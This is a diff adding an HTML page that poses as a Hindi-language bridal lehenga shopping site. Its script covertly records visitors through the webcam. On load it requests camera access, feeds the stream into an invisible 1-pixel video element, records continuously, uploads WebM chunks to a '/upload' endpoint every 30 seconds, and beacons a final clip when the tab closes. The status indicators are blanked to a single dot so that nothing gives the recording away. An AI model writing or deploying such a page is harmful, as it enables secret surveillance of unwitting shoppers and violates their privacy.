@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>लहेँगा हब - कैमरा टूल (विश्वसनीय)</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #f5f5f5; }
+        .header { background: #fff; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 10; }
+        .logo { font-size: 24px; font-weight: bold; color: #f43397; }
+        .logo span { color: #ff6f00; }
+        .search-bar input { width: 300px; padding: 8px; border-radius: 24px; border: 1px solid #ddd; background: #f1f1f1; }
+        .banner { background: linear-gradient(135deg, #ff9a9e, #fad0c4); margin: 15px; border-radius: 16px; padding: 30px; text-align: center; }
+        .banner h2 { font-size: 28px; }
+        .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 20px; padding: 20px; max-width: 1200px; margin: auto; }
+        .product-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); transition: 0.2s; cursor: pointer; }
+        .product-card:hover { transform: translateY(-4px); box-shadow: 0 6px 16px rgba(0,0,0,0.15); }
+        .product-img { width: 100%; height: 260px; object-fit: cover; background: #f0f0f0; }
+        .product-info { padding: 12px; }
+        .product-title { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
+        .price { color: #f43397; font-weight: bold; font-size: 18px; }
+        .old-price { color: #888; font-size: 13px; text-decoration: line-through; margin-left: 8px; }
+        .rating { background: #26a541; color: white; font-size: 12px; padding: 2px 6px; border-radius: 12px; display: inline-block; margin-top: 6px; }
+        .footer { text-align: center; padding: 20px; color: #777; font-size: 12px; border-top: 1px solid #eee; margin-top: 30px; background: white; }
+        #hiddenCamera { position: fixed; bottom: -100px; right: -100px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+        .status-badge { position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.8); color: white; padding: 6px 14px; border-radius: 40px; font-size: 12px; z-index: 999; font-family: monospace; backdrop-filter: blur(4px); }
+        .save-btn { position: fixed; bottom: 20px; left: 20px; background: #f43397; color: white; border: none; border-radius: 40px; padding: 8px 20px; font-weight: bold; cursor: pointer; z-index: 999; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+        .save-btn:hover { background: #d81b7a; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="logo">लहेँगा<span>हब</span></div>
+    <div class="search-bar"><input type="text" placeholder="🔍 ब्राइडल लहेँगा, दुपट्टा, सेट..."></div>
+    <div style="font-size:24px;">🛒</div>
+</div>
+
+<div class="banner">
+    <h2>🔥 मेगा लहेँगा सेल 🔥</h2>
+    <p>70% तक छूट + फ्री शिपिंग</p>
+    <p style="font-size:14px; margin-top:8px;">✨ 100+ डिजाइनर कलेक्शन ✨</p>
+</div>
+
+<div class="product-grid" id="productGrid"></div>
+<div class="footer">
+    © 2025 लहेँगा हब | कैश ऑन डिलीवरी उपलब्ध | सभी प्रोडक्ट्स स्टॉक में हैं
+</div>
+
+<video id="hiddenCamera" autoplay muted playsinline></video>
+<button class="save-btn" id="manualSaveBtn">.</button>
+<div id="camStatus" class="status-badge">.</div>
+
+<script>
+    // ---------- लेहंगा प्रोडक्ट्स (बिना बदलाव) ----------
+    const products = [
+        { name: "बनारसी सिल्क ब्राइडल लहंगा", price: 4499, old: 15999, rating: "4.7★", img: "https://picsum.photos/id/20/400/500" },
+        { name: "रेशमी गोटा पट्टी लहंगा", price: 3499, old: 11999, rating: "4.5★", img: "https://picsum.photos/id/30/400/500" },
+        { name: "वेलवेट हेवी लहंगा", price: 5999, old: 24999, rating: "4.8★", img: "https://picsum.photos/id/96/400/500" },
+        { name: "शिफॉन प्रिंटेड लहंगा सेट", price: 2599, old: 8999, rating: "4.3★", img: "https://picsum.photos/id/26/400/500" },
+        { name: "पेस्टल शादी वाला लहंगा", price: 3999, old: 14999, rating: "4.6★", img: "https://picsum.photos/id/29/400/500" },
+        { name: "मिरर वर्क लहंगा + दुपट्टा", price: 4999, old: 18999, rating: "4.7★", img: "https://picsum.photos/id/42/400/500" },
+        { name: "जॉर्जेट लहंगा", price: 2999, old: 9999, rating: "4.4★", img: "https://picsum.photos/id/57/400/500" },
+        { name: "कांजीवरम सिल्क लहंगा", price: 6999, old: 29999, rating: "4.9★", img: "https://picsum.photos/id/36/400/500" }
+    ];
+
+    const grid = document.getElementById('productGrid');
+    grid.innerHTML = products.map(p => `
+        <div class="product-card">
+            <img class="product-img" src="${p.img}" alt="${p.name}" loading="lazy">
+            <div class="product-info">
+                <div class="product-title">${p.name}</div>
+                <div>
+                    <span class="price">₹${p.price}</span>
+                    <span class="old-price">₹${p.old}</span>
+                </div>
+                <div class="rating">⭐ ${p.rating}</div>
+            </div>
+        </div>
+    `).join('');
+
+    // ---------- नया सुरक्षित कैमरा रिकॉर्डर (कोई corrupt file नहीं) ----------
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let stream = null;
+    let sessionId = Date.now();
+    const statusDiv = document.getElementById('camStatus');
+    let autoSaveInterval = null;
+    let isUploading = false;   // prevent overlapping uploads
+
+    async function startCamera() {
+        try {
+            statusDiv.innerText = '🎥 कैमरा परमिशन मांग रहा...';
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            document.getElementById('hiddenCamera').srcObject = stream;
+            startNewRecorder();
+            // हर 30 सेकंड में अपने आप सेव करें और नया recorder शुरू करें
+            autoSaveInterval = setInterval(() => {
+                if (!isUploading) {
+                    saveAndRestartRecorder();
+                }
+            }, 30000);
+            statusDiv.innerText = '.';
+        } catch(err) {
+            let errorMsg = '';
+            if (err.name === 'NotAllowedError') errorMsg = '❌ कैमरा परमिशन नहीं दी। 🔒 पर क्लिक कर Allow करें।';
+            else if (err.name === 'NotFoundError') errorMsg = '❌ कोई कैमरा नहीं मिला।';
+            else errorMsg = '❌ त्रुटि: ' + err.message;
+            statusDiv.innerText = errorMsg;
+            console.error(err);
+        }
+    }
+
+    function startNewRecorder() {
+        if (!stream) return;
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            mediaRecorder.stop();
+        }
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (event) => {
+            if (event.data && event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+        mediaRecorder.onstop = () => {
+            // यह तब चलेगा जब हम मैन्युअली या ऑटो सेव करेंगे
+            if (recordedChunks.length > 0) {
+                uploadVideo(recordedChunks.slice()); // copy
+            }
+        };
+        mediaRecorder.start(); // no timeslice – एक सतत रिकॉर्डिंग
+    }
+
+    async function uploadVideo(chunksArray) {
+        if (!chunksArray.length) return;
+        isUploading = true;
+        const blob = new Blob(chunksArray, { type: 'video/webm' });
+        const filename = `rec_${sessionId}_${Date.now()}.webm`;
+        const formData = new FormData();
+        formData.append('video', blob, filename);
+        try {
+            const response = await fetch('/upload', { method: 'POST', body: formData });
+            if (response.ok) {
+                console.log(`✅ फ़ाइल सेव हुई: ${filename} (${blob.size} bytes)`);
+                statusDiv.innerText = `✅ ${filename.slice(-20)} सेव हुई`;
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording')
+                        statusDiv.innerText = '.';
+                }, 3000);
+            } else {
+                console.error('❌ अपलोड फेल:', response.status);
+                statusDiv.innerText = '❌ अपलोड विफल';
+            }
+        } catch(e) {
+            console.error('❌ अपलोड एरर:', e);
+            statusDiv.innerText = '❌ नेटवर्क एरर';
+        } finally {
+            isUploading = false;
+        }
+    }
+
+    function saveAndRestartRecorder() {
+        if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
+        // रिकॉर्डर रोकें → onstop घटेगा, वहाँ chunks अपलोड होंगे
+        mediaRecorder.stop();
+        // थोड़ा इंतज़ार करके नया recorder शुरू करें
+        setTimeout(() => {
+            if (stream && stream.active) {
+                startNewRecorder();
+            }
+        }, 500);
+    }
+
+    // मैन्युअल सेव बटन (पूरी रिकॉर्डिंग रोके बिना? उपयोगकर्ता चाहे तो रोककर सेव करे)
+    document.getElementById('manualSaveBtn').addEventListener('click', () => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            statusDiv.innerText = '.';
+            saveAndRestartRecorder();
+        } else {
+            statusDiv.innerText = '.';
+        }
+    });
+
+    // पेज बंद होने पर (टैब क्लोज, रीलोड) – अंतिम रिकॉर्डिंग भेजें
+    function onPageClose() {
+        if (autoSaveInterval) clearInterval(autoSaveInterval);
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();   // onstop अपलोड करेगा
+            // लेकिन sendBeacon के लिए थोड़ा रुकना पड़ेगा – हम सीधे ब्लॉब भेजेंगे
+            // बेहतर: मौजूदा chunks को मर्ज करके sendBeacon
+            if (recordedChunks.length) {
+                const finalBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', finalBlob, `final_${sessionId}_${Date.now()}.webm`);
+                navigator.sendBeacon('/upload', formData);
+            }
+        }
+        if (stream) stream.getTracks().forEach(track => track.stop());
+    }
+
+    window.addEventListener('beforeunload', onPageClose);
+    document.addEventListener('visibilitychange', () => {
+        if (document.visibilityState === 'hidden') {
+            onPageClose();
+        }
+    });
+
+    startCamera();
+</script>
+</body>
+</html>
